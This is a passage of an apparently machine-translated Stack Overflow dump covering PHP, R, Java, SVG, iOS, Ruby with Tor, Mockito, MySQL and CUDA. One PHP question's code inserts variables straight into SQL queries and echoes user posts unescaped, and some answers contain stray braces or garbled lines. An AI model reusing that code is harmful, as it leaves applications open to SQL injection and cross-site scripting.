        "url":"/Atlanta%20GA/Dey%20duma%20amensa/12%20Amey%20luvudees%20tu.mp3"},

            {"name":"13 Adjes",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/13%20Adjes.mp3"},

            {"name":"14 Wusteelow",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/14%20Wusteelow.mp3"}
  ]}},

               {"id":"Tuka Jeelabas",
"key":"Tuka Jeelabas",
"doc":{"_id":"Tuka Jeelabas",
"album":"Tuka Jeelabas",
"artwork":"http://godsgypsychristianchurch.net/music_artwork/DEFAULT_COVER2.png",
"baseurl":"http://www.godsgypsychristianchurch.net/music",
"church":"Atlantic City",
"cityartwork":"http://www.ggcc.tv/LogoNE.png",
"des":"Tuka Jeelabas From the Atlantic City Church, Pastor Sam",
"tracks":[

        {"name":"1 Tuka Jeelabas",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/01%20Tuka%20Jeelabas.mp3"},

            {"name":"2 Odel Trodass",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/02%20Odel%20Trodass.mp3"},

            {"name":"3 May Sudov",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/03%20May%20Sudov.mp3"},

            {"name":"4 Moo Si Yetees",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/04%20Moo%20Si%20Yetees.mp3"},

            {"name":"5 Ferrdey Cho Annov",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/05%20Ferrdey%20Cho%20Annov.mp3"},

            {"name":"6 Aven Jeelabas",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/06%20Aven%20Jeelabas.mp3"},

            {"name":"7 Penas Hallelujah",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/07%20Penas%20Hallelujah.mp3"},

            {"name":"8 Falling in Love with Jesus",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/08%20Falling%20in%20Love%20with%20Jesus.mp3"},

            {"name":"9 Lord You Are",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/09%20Lord%20You%20Are.mp3"},

            {"name":"10 Tu Des Pocha",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/10%20Tu%20Des%20Pocha.mp3"},

            {"name":"11 Numma Odel",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/11%20Numma%20Odel.mp3"},

            {"name":"12 Preaching",
        "url":"/Atlantic%20City/Tuka%20Jeelabas/12%20Preaching.mp3"}
  ]}},

        {"id":"Set Free",
"key":"Set Free",
"doc":{"_id":"Set Free",
"album":"Set Free",
"artwork":"http://godsgypsychristianchurch.net/music_artwork/maryland/maryland.jpg",
"baseurl":"http://www.godsgypsychristianchurch.net/music",
"church":"Baltimore MD",
"cityartwork":"http://www.ggcc.tv/LogoNE.png",
"des":"This album is from the Baltimore MD Church, Pastor Nicky",
"tracks":[

        {"name":"1 Set Free",
        "url":"/Maryland/Set_Free/01%20SET%20FREE.mp3"},

            {"name":"2 Chedo Anov",
        "url":"/Maryland/Set_Free/02%20CHEDO%20ANOV.mp3"},

            {"name":"3 Ajujaras",
        "url":"/Maryland/Set_Free/03%20AJUKARAS.mp3"},

            {"name":"4 Pey cho drom",
        "url":"/Maryland/Set_Free/04%20PEY%20CHO%20DROM.mp3"},

            {"name":"5 Rie la Rieango",
        "url":"/Maryland/Set_Free/05%20RIE%20LA%20RIEANGO.mp3"},

            {"name":"6 Asoonen",
        "url":"/Maryland/Set_Free/06%20ASOONEN.mp3"},

            {"name":"7 Aven",
        "url":"/Maryland/Set_Free/07%20AVEN.mp3"},

            {"name":"8 Falling in love with Jesus",
        "url":"/Maryland/Set_Free/08%20FALLING%20IN%20LOVE%20WITH%20JESUS.mp3"},

            {"name":"9 Hallelujah",
        "url":"/Maryland/Set_Free/09%20HALLELUJAH.mp3"},

            {"name":"10 Kie woodod",
        "url":"/Maryland/Set_Free/10%20KIE%20WOODOD.mp3"},

            {"name":"11 Jesus Messiah",
        "url":"/Maryland/Set_Free/11%20JESUS%20MESSIAH.mp3"},

            {"name":"12 Tu Son Swento",
        "url":"/Set_Free/12%20TU%20SON%20SWINTO.mp3"},

            {"name":"13 Mey lulvodeev",
        "url":"/Maryland/Set_Free/13%20MEY%20LUVOODEV.mp3"},

            {"name":"14 Preaching",
        "url":"/Maryland/Set_Free/14%20PREACHING.mp3"}
  ]}}, 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:01:48.177

试试这个作为你的 php 代码：

```
$churches = array();
$count = 1;
foreach ($json['rows'] as $row) {
    ++$count;
    if (!in_array($row[doc]['church'], $churches)){
        $churches[] = $row[doc]['church'];
    }
}
foreach ($churches as $church){
    print '<a href="getalbums.php?churchname=' . urlencode($church) . '><br />' . htmlentities($church) . '</a>'; }
} 
exit; 
```

在打开第二个循环之前，您没有关闭第一个 foreach 循环。您的缩进/大括号结构非常混乱。如果您对此更加勤奋，您会更容易注意到这样的小错误

# mysql - Symfony2 - 将mysql数据库备份到文件中

> ID：13353526
> 
> 赞同：0
> 
> 时间：2012-11-12T23:48:24.710
> 
> 标签：mysql, symfony, phpmyadmin

是否有某个捆绑包可以将mysql数据库备份到phpmyadmin之类的文件中？我根本无法访问 shell。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-04-26T12:10:22.023

我正在使用**CloudBackupBundle**备份数据库和文件。此捆绑包可帮助您备份数据库并将其上传到云中，只需一个 Symfony2 命令。

使用此捆绑包，您可以创建 Cron 命令来创建备份并将其上传到云存储。

[GitHub 存储库。](https://github.com/dizda/CloudBackupBundle)

# r - 格式化数字，不带前导零

> ID：13353531
> 
> 赞同：1
> 
> 时间：2012-11-12T23:48:48.617
> 
> 标签：r

格式化数字以使其不显示前导零的最佳方法是什么。例如：

```
test = .006
sprintf/format/formatC( ??? )  # should result in ".006" 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T23:55:01.477

我相信我以前回答过一次，但找不到。你*不能*告诉`sprintf()`et al 关于删除前导零的格式......所以你必须自己做，例如通过`substring()`：

```
R> val <- 0.006
R> aa <- substring(sprintf("%4.3f", val), 2)
R> aa
[1] ".006"
R> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-10-03T01:01:47.637

```
f <- function(x) gsub("^(\\s*[+|-]?)0\\.", "\\1.", as.character(x))
f(0.006)
# ".006"
f(-0.006)
# "-.006"
f("+0.006")
# "+.006"
f(" 0.006")
# " .006"
f(10.05)
# "10.05" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T00:01:39.243

您始终可以使用正则表达式搜索和替换来修复它：

```
library(stringr)
test = .006
str_replace(as.character(test), "^0\\.", ".") 
```

不是最优雅的答案，但它有效。替换您喜欢的任何字符串转换`as.character`，例如`sprintf`使用您喜欢的浮点格式。

# java - 将一个对象添加到多个 java 集合：这会产生多个副本吗？

> ID：13353537
> 
> 赞同：5
> 
> 时间：2012-11-12T23:49:18.757
> 
> 标签：java, collections

如果我将同一个对象添加到两个不同的集合中，这是否会在每个集合中复制该对象，或者这些集合是否会引用同一个对象？

我想做的是使用两个不同的集合来管理同一组对象，但允许我使用不同的方法来访问和排序对象。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-12T23:51:55.577

不，通过将对象添加到集合中，您只是将引用传递给该对象（对象存储在堆上的地址）。因此，将一个对象多次添加到不同的集合就像分发名片一样，您不是在复制自己，而是多个人知道在哪里可以找到您；）

这里有一些代码：

```
LinkedList<MyObject> list1 = new LinkedList<MyObject>();
LinkedList<MyObject> list2 = new LinkedList<MyObject>();
MyObject obj = new MyObject();
list1.add(obj);
list2.add(obj); // This does not create a copy of the object, only the value of the address where to find the object in the heap (memory) is being copied 
```

# svg - 克隆 svg 对象（行）

> ID：13353541
> 
> 赞同：1
> 
> 时间：2012-11-12T23:49:36.313
> 
> 标签：svg

我创建了一个基本的 pcb 安装变压器的 svg 文件。有没有更好的方法来创建绕组，而不是像下面这样有很多线：

```
<g id="primarywinding">
        <line id="winding0" style="fill:none;stroke:black;stroke-width:2" x1="60" y1="67" x2="350" y2="67" />
        <use xlink:href="#winding0" transform="translate(0, 4)"/>
        <use xlink:href="#winding0" transform="translate(0, 8)"/>
        <use xlink:href="#winding0" transform="translate(0, 12)"/>
        <use xlink:href="#winding0" transform="translate(0, 16)"/>
        <use xlink:href="#winding0" transform="translate(0, 20)"/>
        <use xlink:href="#winding0" transform="translate(0, 24)"/>
        <use xlink:href="#winding0" transform="translate(0, 28)"/>
        <use xlink:href="#winding0" transform="translate(0, 32)"/>
        <use xlink:href="#winding0" transform="translate(0, 36)"/>
        <use xlink:href="#winding0" transform="translate(0, 40)"/>
        <use xlink:href="#winding0" transform="translate(0, 44)"/>
        <use xlink:href="#winding0" transform="translate(0, 48)"/>
        <use xlink:href="#winding0" transform="translate(0, 52)"/>
        <use xlink:href="#winding0" transform="translate(0, 56)"/>
        <use xlink:href="#winding0" transform="translate(0, 60)"/>
        <use xlink:href="#winding0" transform="translate(0, 64)"/>
        <use xlink:href="#winding0" transform="translate(0, 68)"/>
        <use xlink:href="#winding0" transform="translate(0, 72)"/>
        <use xlink:href="#winding0" transform="translate(0, 76)"/>
        <use xlink:href="#winding0" transform="translate(0, 80)"/>
        <use xlink:href="#winding0" transform="translate(0, 84)"/>
        <use xlink:href="#winding0" transform="translate(0, 88)"/>
        <use xlink:href="#winding0" transform="translate(0, 92)"/>
        <use xlink:href="#winding0" transform="translate(0, 96)"/>
</g> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T04:10:15.933

是的，只需重复`<line>`标签而不是使用 use。您可以按照自己的方式使用变换，也可以直接调整坐标。至少在 Firefox 上它会快得多。您可以使用 CSS 样式进行填充、描边等，然后为所有线条赋予`class`属性。

更好的是使用[路径](http://www.w3.org/TR/SVG/paths.html)并使用[l 或 L 或用于您的数据 - h 或 H](http://www.w3.org/TR/SVG/paths.html#PathDataLinetoCommands) 用于行。[这里](https://developer.mozilla.org/en-US/docs/SVG/Tutorial/Paths)有一些路径示例。

# iphone - 不完整的实现 xcode 按钮以禁用按钮

> ID：13353543
> 
> 赞同：1
> 
> 时间：2012-11-12T23:50:12.460
> 
> 标签：iphone, objective-c, ios, xcode, ios6

我是 Objective C 和 Xcode 的新手，所以请耐心等待！我编写了一个控制 5 个按钮和 1 个重置按钮的程序。如果按下 5 个按钮中的任何一个，它们都应该被禁用（灰显），直到按下重置按钮。这是我的尝试：

视图控制器.h

```
#import <UIKit/UIKit.h>

@interface ViewController : UIViewController{
    IBOutlet UIButton *button1;
    IBOutlet UIButton *button2;
    IBOutlet UIButton *button3;
    IBOutlet UIButton *button4;
    IBOutlet UIButton *button5;
    IBOutlet UIButton *resetButton;
}
    @property(retain,nonatomic)UIButton *button1;
    @property(retain,nonatomic)UIButton *button2;
    @property(retain,nonatomic)UIButton *button3;
    @property(retain,nonatomic)UIButton *button4;
    @property(retain,nonatomic)UIButton *button5;
    @property(retain,nonatomic)UIButton *resetButton;
    - (IBAction)anyButtonPressed:(UIButton *)sender;
    - (IBAction)resetPressed:(UIButton *)sender;

@end 
```

视图控制器.m

```
#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

@synthesize button1, button2, button3, button4, button5, resetButton;

- (void)viewDidLoad
{
    [super viewDidLoad];
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
}

-(IBAction)anyButtonPressed{
    button1.enabled = NO;
    button2.enabled = NO;
    button3.enabled = NO;
    button4.enabled = NO;
    button5.enabled = NO;

}

-(IBAction)resetPressed{
    button1.enabled = YES;
    button2.enabled = YES;
    button3.enabled = YES;
    button4.enabled = YES;
    button5.enabled = YES;

}

@end 
```

但它说 ViewController 旁边的实现不完整，当我在模拟器中按下一个按钮时，它崩溃了。请帮帮我？还请提出任何更简单的方法来实现这一点！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:54:38.940

您的按钮操作方法签名在您的实现中不正确。将您的代码更改为：

```
-(IBAction)anyButtonPressed:(UIButton *)sender {
    button1.enabled = NO;
    button2.enabled = NO;
    button3.enabled = NO;
    button4.enabled = NO;
    button5.enabled = NO;
}

-(IBAction)resetPressed:(UIButton *)sender {
    button1.enabled = YES;
    button2.enabled = YES;
    button3.enabled = YES;
    button4.enabled = YES;
    button5.enabled = YES;
} 
```

# ruby - Ruby、Tor 和 Net::HTTP::Proxy

> ID：13353544
> 
> 赞同：12
> 
> 时间：2012-11-12T23:50:18.550
> 
> 标签：ruby, proxy, tor, net-http

如果这是一个愚蠢的疑问，我提前道歉：我想在我的 Ruby 代码中使用代理来获取一些网页。我想偷偷摸摸！所以我正在使用 Tor。

我正在运行 Tor，并且可以像往常一样使用 Net::HTTP.get(uri)。但我不知道如何使用 Net::HTTP::Proxy 来获取 uri。我也不知道使用 Tor 将如何帮助我匿名获取。

任何帮助是极大的赞赏。请不要只[为 Net::HTTP::Proxy 添加指向 ruby​​-doc 页面的链接](http://ruby-doc.org/stdlib-1.9.3/libdoc/net/http/rdoc/Net/HTTP.html#method-c-Proxy)。如果我明白这一点，我就不会在这里问这个了:-)

* * *

另一种简单的方法是使用[SOCKSify](http://socksify.rubyforge.org/)，但在这种情况下，我收到以下错误：

`/usr/lib/ruby/gems/1.9.2-p290/gems/socksify-1.5.0/lib/socksify.rb:189:in 'socks_authenticate': SOCKS version not supported (SOCKSError)`

我以前从未做过任何网络编程。任何有关这方面的指导也将非常有帮助。谢谢 ：-）

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-14T16:37:04.110

您使用的是 HTTP 代理类，因此您必须提供 HTTP 代理的 IP。Tor 浏览器**没有**捆绑 HTTP 代理。

因此，您可以安装一些代理软件，例如[Privoxy](http://www.privoxy.org/)并将其配置为使用 Tor 的 SOCKS：

在*config.txt* `forward-socks4a / 127.0.0.1:9050 .`

然后在你的脚本中使用 Privoxy 的默认*监听地址：*

```
proxy = Net::HTTP::Proxy('127.0.0.1',8118) 
```

**或**使用 SOCKSify。根据[文档](http://socksify.rubyforge.org/)：

```
require 'socksify/http'
uri = URI.parse('http://rubyforge.org/')
Net::HTTP.SOCKSProxy('127.0.0.1', 9050).start(uri.host, uri.port) do |http|
  http.get(uri.path)
end 
```

不需要额外的软件..

**第三种**解决方案是使用 SOCKSify，如下所示：

```
$ socksify_ruby localhost 9050 script.rb 
```

它重定向 Ruby 脚本的所有 TCP 连接，这意味着您根本不需要使用任何代理代码。

*为澄清起见，您必须了解 127.0.0.1:9050 是 Tor 的 SOCKS 地址，而 127.0.0.1:8118 是 Privoxy 的地址。*

# java - 用 mockito 模拟多部分 mime 请求

> ID：13353545
> 
> 赞同：4
> 
> 时间：2012-11-12T23:50:21.680
> 
> 标签：java, web-services, junit, mockito, mime-message

我对 Mockito 和模拟 servlet 进行测试还很陌生。我在模拟 HttpServletRequest 时遇到问题，它将一些表单数据作为 MimeMultiPart 发送到我的 servlet。在我的 servlet 中，我调用`request.getInputStream()`如下：

```
mimeMultiPart = new MimeMultipart(new ByteArrayDataSource(
                request.getInputStream(), Constants.MULTI_PART_FORM_DATA)); 
```

当我模拟我的输入流时，我创建了一个完整的 MimeMultiPart 消息，然后我尝试在下面的代码中从中返回一个 ServletInputStream

```
 //Helper function to create ServletInputStream
private ServletInputStream createServletInputStream(Object object)
        throws Exception {

    //create output stream
    ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
    ObjectOutputStream outStream = new ObjectOutputStream(byteOut);

    //this part no workey
    outStream.writeObject(object);

    //create input stream
    final InputStream byteIn = new ByteArrayInputStream(byteOut.toByteArray());

    //create a new ServletInputStream and return it
    return new ServletInputStream() {

        @Override
        public int read() throws IOException {
            return byteIn.read();
        }
    };
}

@Test
public void testDoPost() throws Exception {
    PrintWriter writer;
    writer = new PrintWriter("testSendMultiPartBatchResponse.txt");
    when(response.getWriter()).thenReturn(writer);

            //this is the mocked request
    when(request.getInputStream()).thenReturn(
            createServletInputStream(multiPartResponse));

. . . 
```

现在，当我运行此测试时，我收到以下错误`outStream.writeObject(object)`：

```
java.io.NotSerializableException: javax.mail.internet.MimeMultipart
at java.io.ObjectOutputStream.writeObject0(Unknown Source)
at java.io.ObjectOutputStream.writeObject(Unknown Source)

    . . . 
```

没有必要发布堆栈跟踪的其余部分，我很确定问题是 MimeMultiPart 不可序列化，但我不知道如何纠正这个问题。还有另一种方法来模拟请求吗？我很茫然 ：（

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-13T00:08:07.383

我认为这应该有效：

```
final ByteArrayOutputStream os = new ByteArrayOutputStream ();
multiPartResponse.writeTo (os);
final ByteArrayInputStream is = new ByteArrayInputStream (os.toByteArray ());
when(request.getInputStream()).thenReturn(new ServletInputStream() {
        @Override
        public int read() throws IOException {
            return is.read();
        }
    }); 
```

# c# - Windows Phone 应用程序在加载主页时冻结？

> ID：13353547
> 
> 赞同：0
> 
> 时间：2012-11-12T23:50:23.453
> 
> 标签：c#, windows-phone-7, xaml

我的 windows phone 应用程序在加载主页时冻结。我在主构造函数上设置了断点，它会触发 OnNavigatedTo 事件，但不会触发“Loaded”事件。它通过构造函数中的 InitializeComponent()。它显示启动屏幕和主页应用程序栏，但此时冻结。

我最近重构了我的主命名空间，这导致主页无法加载。我通过启动对象修复了这个问题。

在重构之前，一切都在工作。

我应该包括什么代码？此时项目相当大，所以我不知道你真的希望我发布多少代码。

有任何想法吗？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T20:30:44.003

好的，我发现了问题。在 App.Xaml.cs 中，我犯了以下关键错误：

这是我的代码：

```
private void CompleteInitializePhoneApplication(object sender, NavigationEventArgs e)
    {
        // Set the root visual to allow the application to render
        if (RootVisual != null && RootVisual != RootFrame)
            RootVisual = RootFrame;

        // Remove this handler since it is no longer needed
        RootFrame.Navigated -= CompleteInitializePhoneApplication;
    } 
```

这应该是：

```
 private void CompleteInitializePhoneApplication(object sender, NavigationEventArgs e)
    {
        // Set the root visual to allow the application to render
        if (RootVisual != RootFrame)
            RootVisual = RootFrame;

        // Remove this handler since it is no longer needed
        RootFrame.Navigated -= CompleteInitializePhoneApplication;
    } 
```

Resharper 认为最好先检查 RootVisual 是否为空。令人难以置信的令人讨厌的错误，因为它只会挂在启动 PNG 并且永远不会加载，显然是因为没有设置 RootVisual。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T00:26:20.317

我以前也遇到过这样的困难。听起来这可能是您的 XAML 中的一个问题，但实际上没有您的解决方案很难说。

您可以尝试以下几件事：

*   检查所有静态/动态资源以确保它们仍然正确解析。
*   检查您正在使用的任何绑定和绑定转换器是否仍在正确解析。特别是转换器，我过去曾遇到过他们的问题。

如果您遇到异常，但与代码中的特定点无关：

*   尝试在您可能正在使用的任何或所有自定义属性上放置断点。默认情况下，调试器不会进入属性。我发现这是我自己的工作中出现许多异常的原因。

希望这可以帮助！

# php - 如何浏览我的社交网络上的个人资料？

> ID：13353548
> 
> 赞同：-1
> 
> 时间：2012-11-12T23:50:28.673
> 
> 标签：php

在我的社交网络中，我被难住了。我已经建立了一个相当不错的但能够通过使用他们的名字 (http://www.theqlick.com/usernamehere) 来查看他们的个人资料来浏览个人资料。

因此，人们在某人的虚拟钉板上发帖，作为回报，他们可以通过点击他们来查看他们的个人资料，然后他们的个人资料就会弹出，就像在 Facebook 上一样。但是我被重定向到没有网址，我看不出有什么问题，任何人都可以提出什么问题以及我应该怎么做？

我的代码如下：

```
 <?
  $getposts = mysql_query("SELECT * FROM posts WHERE user_posted_to='$username' ORDER BY id DESC LIMIT 10") or die(mysql_error());
    while ($row = mysql_fetch_assoc($getposts)) {
                    $id = $row['id'];
                    $body = $row['body'];   
                    $date_added = $row['date_added'];
                    $added_by = $row['added_by'];
                    $user_posted_to = $row['user_posted_to'];  

                                            $get_user_info = mysql_query("SELECT * FROM users WHERE username='$added_by'");
                                            $get_info = mysql_fetch_assoc($get_user_info);
                                            $profilepic_info = $get_info['profile_pic'];
                                            if ($profilepic_info == "") {
                                             $profilepic_info = "./img/default_pic.jpg";
                                            }
                                            else
                                            {
                                             $profilepic_info = "./userdata/profile_pics/".$profilepic_info;
                                            }

                    echo "
                                            <div style='float: left;'>
                                            <img src='$profilepic_info' height='60'>
                                            </div>
                    <div class='posted_by'>
                    Posted by:
                                            <a href='$added_by'>$added_by</a> on $date_added</div>
                                            <br /><br />
                                            <div  style='max-width: 600px;'>
                                            $body<br /><p /><p />
                                            </div>
                                            <hr />
                    "; 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T01:08:06.280

使用`mod_rewrite`如...

```
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{REQUEST_FILENAME} -s [OR]
    RewriteCond %{REQUEST_FILENAME} -l [OR]
    RewriteCond %{REQUEST_FILENAME} -d
    RewriteRule ^.*$ - [NC,L]
    RewriteRule ^(.*)$ profile.php?user=$1 [NC,L]
</IfModule> 
```

在`.htacess`您服务器上的文件中。更改`profile.php`为您用于实际提取配置文件的脚本。检查后的 3 行`RewriteEngine On`以确保访问的文件不是链接、目录或文件。它会将其他所有内容重写为`profile.php`. 不过，我强烈建议使用更结构化的 URI 方案，而不是`/profilenamehere`像`/profile/username`. 为此，将最后一个更改`RewriteRule`为`RewriteRule ^/profile/([a-zA-Z]+)$ profile.php?user=$1 [NC,L]`

# mysql - 使 MySQL IN 子句区分大小写

> ID：13353549
> 
> 赞同：10
> 
> 时间：2012-11-12T23:50:33.300
> 
> 标签：mysql, sql, case-sensitive, in-clause, string-search

有谁知道我如何使 IN 子句以区分大小写的方式运行？我已经看到 COLLATE 可以与 LIKE 一起用于字符串搜索，但我不知道它是否或如何与 IN 一起使用。例如，我想做类似的事情

```
SELECT * FROM pages_table WHERE topic IN ('Food','NightLife','Drinks') 
```

我希望它返回主题为“食物”的页面，但不返回主题为“食物”的页面，而这正是当前在此查询中发生的情况。谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-12T23:56:35.513

您实际上可以像在其他示例中看到的那样使用它：

```
SELECT *
FROM pages_table
WHERE CAST(topic AS CHAR CHARACTER SET latin1)
        COLLATE latin1_general_cs IN ('Food','NightLife','Drinks') 
```

这会将字符集更改为支持区分大小写的字符集，然后整理列（根据您自己的字符编码，您可能不必这样做）。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-13T07:27:03.330

您可以使用[**`BINARY`**](http://dev.mysql.com/doc/refman/5.5/en/cast-functions.html#operator_binary)运算符。就像是：

```
SELECT *
FROM pages_table
WHERE CAST(topic AS BINARY) IN ('Food','NightLife','Drinks'); 
```

## [SQL 小提琴演示](http://www.sqlfiddle.com/#!2/e76a0/4)

# debugging - Nsight 2.2 有时有效有时无效

> ID：13353553
> 
> 赞同：1
> 
> 时间：2012-11-12T23:50:48.240
> 
> 标签：debugging, cuda, gpu

我有关于 Parallel Nsight 2.2 调试器的问题。这很奇怪，我不知道如何描述它。无论如何，它有时有效，有时无效。

我观察到的是，它适用于以 3 个元素命名的动态数组（该数组对 cuda_kernels 或任何其他函数（如 cudaMemcpy atc ...）没有影响）。这很重要......如果我将大小设置为 4+，它就会掉下来，没有错误，什么都没有掉下来。

有趣的事实是，如果我通过正常的调试器孔程序正常运行它，则可以正常工作并获得正确的结果。另一个有趣的事实是，当将此数组设置为静态时

无符号拓扑[4]；

并设置相同的值 Nsight 调试器工作但非常缓慢。

所以首先我评论了所有 cuda 源代码（如内核和所有 cuda 函数），但仍然相同 - 它失败了。所以我开始评论更多的host_code，我发现循环（在主机代码中）做了这个令人毛骨悚然的事情。因此，当 Nsght-debug 中的程序到达循环（在文本下）时，它会掉下来，但是，当我在此循环中编写命令以在屏幕上打印每个循环的编号时，它会运行，循环完成，孔程序完成，然后调试器告诉我：

调试断言失败！程序：文件：f:\dd\vctools\crt_bld\self_x86\crt\src\dbgheap.c 行：1322

表达式：_CrtIsValidHeapPointer(pUserData)

....我什至没有磁盘f ...所以wtf？？？

无论如何，在普通调试器上它运行良好并且结果正确。

这是提到循环和动态数组*拓扑：

```
unsigned *topology;
unsigned numberOfLayersInput = 5;
topology = new unsigned [numberOfLayersInput];

topology[0] = 784;
topology[1] = 1000;
topology[2] = 800;
topology[3] = 300;
topology[4] = 10;

kernelTopology_ *topologyOfKernels;
topologyOfKernels = new kernelTopology_ [numberOfLayersInput - 1];
for (int i = 0, numberOfThreads; i < numberOfLayersInput; i++)
{
    cout <<i << endl;   // this is the added line!
    numberOfThreads = fixedTopology[i];
    topologyOfKernels[i].size = numberOfThreads;

    if(numberOfThreads > THREADS_PER_BLOCK)
        topologyOfKernels[i].BLOCK_SIZE = THREADS_PER_BLOCK;
    else topologyOfKernels[i].BLOCK_SIZE = numberOfThreads;

    if(numberOfThreads <= THREADS_PER_BLOCK)
        topologyOfKernels[i].GRID_SIZE = 1;
    else if(fixedTopology[i] % topologyOfKernels[i].BLOCK_SIZE == 0)
        topologyOfKernels[i].GRID_SIZE = fixedTopology[i] / topologyOfKernels[i].BLOCK_SIZE;
    else        
        topologyOfKernels[i].GRID_SIZE = (fixedTopology[i] / topologyOfKernels[i].BLOCK_SIZE) + 1;
} 
```

我在这段代码中看不到任何错误......正常的调试器也没有问题。

我已经重新安装了图形驱动程序、CUDA 工具包、CUDA SDK 和 Paralell Nsight，但它做了同样令人毛骨悚然的事情。顺便说一句，我使用 Win 7 64 位和 VS2010。

有谁知道我应该怎么做？

请让我知道是否有人有任何想法:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T15:41:30.560

错误

```
Debug Assertion Failed! Program: File:f:\dd\vctools\crt_bld\self_x86\crt\src\dbgheap.c Line: 1322 
```

来自 Microsoft C 运行时函数[_CrtIsValidHeapPointer](http://msdn.microsoft.com/en-us/library/ys6cfhhh%28v=vs.100%29.aspx)。默认调试版本在代码中添加了额外的堆和堆栈检查。该函数用于验证指定的指针是否在本地堆中。路径 f:... 是 C 运行时中源文件的位置。此功能是在 Microsoft 构建库时。

断言表示内存访问越界。错误的原因似乎是*topologyOfKernels*的分配不正确。

```
corruption.topologyOfKernels = new kernelTopology_ [numberOfLayersInput - 1]; 
```

应该分配*numberofLayersInput*元素。

```
corruption.topologyOfKernels = new kernelTopology_ [numberOfLayersInput]; 
```

# php - PHP类继承在codeigniter中引用父类

> ID：13353554
> 
> 赞同：0
> 
> 时间：2012-11-12T23:50:52.480
> 
> 标签：php, codeigniter, inheritance, model

这是我的问题。我正在使用 codeigniter，这是我的结构。我在 2 个文件中有 2 个类

```
class Model_setup extends CI_Model 
{
    //functions

    // an update function
    public function update()
    {
        // update stuff
    }
}

// OTHER FILE

class Tests extends Model_setup
{
    // other functions....

    // a totally different update function
    public function update()
    {
        // update a specific set of stuff
    }
} 
```

我想知道是否以及如何引用这两个单独的更新函数。在与这两个不同的控制器中，说出您将`Places_Controller`如何区分这两个类方法之间的区别以及如何确保您只使用两个更新中的一个或另一个？提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:53:41.213

假设您正在加载两个模型，您只需按名称引用它们：

```
$this->Model_setup->update(); 
```

将参考第一种方法，而

```
$this->Tests->update(); 
```

将参考第二个。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T19:46:47.407

所以我被一位朋友启发了如何解决这个问题。这不需要任何 codeigniter frmaework 东西才能正常工作。以下将正常工作：

```
class Model_setup extends CI_Model 
{
    //functions

    // an update function
    public function update()
    {
        // update stuff
    }
}

// OTHER FILE

class Tests extends Model_setup
{
    // other functions....

    // a reference function to the parent function
    public function parent_update($x)
    {
        // update a specific set of stuff
        parent::update($x);
    }

    // a totally different update function
    public function update()
    {
        // update stuff
    }
} 
```

现在从外界来看，假设框架中的另一个控制器，一旦加载了所有内容，您就可以调用以下内容。`$this->tests_model->parent_update($x)`当您希望调用父版本以及`$this->tests_model->update`希望调用`update`Tests 模型的函数时。这行得通，我已经对此进行了测试。

# r - 使用 Marquardt 算法的非线性最小二乘 AR(1)：EViews 与 R

> ID：13353555
> 
> 赞同：2
> 
> 时间：2012-11-12T23:51:04.163
> 
> 标签：r, eviews

几周前，我[发布](https://stackoverflow.com/questions/12805793/ols-estimation-with-ar1-term)了一个深思熟虑的问题，其中包含模糊的信息。这是我试图纠正原始问题并获得更好答案的尝试。

主要**问题**是：我无法使用 EViews 和 R 获得类似的参数估计。

由于我不了解自己的原因，我需要使用 EViews 估计某些数据的参数。这是通过选择 NLS（非线性最小二乘）选项并使用以下公式来完成的：`indep_var c dep_var ar(1)`

EViews 声称他们估计线性 AR(1) 过程，例如：

> Y [t] = a + B * X [t] + u [t]

其中 u [t]错误定义为

> u [t] = p * u [t-1] + e

通过使用等效方程（带有一些代数替换）：

> Y [t] = (1 - p) * a + p * Y [t - 1] + B * X [t] - p * B * X [t - 1] + e [t]

此外，[EViews 论坛上的这个线程](http://forums.eviews.com/viewtopic.php?f=4&t=3768)表明他们的 NLS 估计是由 Marquardt 算法生成的。

现在，估计 AR(1) 过程的首选 R 函数是`arima`. 但是，有两个问题：1）估计是最大似然估计；2）截距估计[实际上不是截距估计](http://www.stat.pitt.edu/stoffer/tsa2/Rissues.htm)。

因此，我转向`nlsLM`了 minpack.lm 包中的函数。此函数使用 Marquardt 算法来实现非线性最小二乘估计，这应该产生与 EViews 实现相同的结果（或至少非常相似的结果）。

现在是代码。我有一个数据框 ( `data`)，其中包含一个自变量和一个因变量，例如由以下代码生成的那个：

```
data <- data.frame(independent = abs(rnorm(48)), dependent = abs(rnorm(48))) 
```

为了估计 EViews 声称估计的方程中的参数（这篇文章中的第 3^个），我使用以下命令：

```
library(minpack.lm)
result <-
nlsLM(dependentB ~ ((1 - theta1) * theta2) + (theta1 * dependentA) +
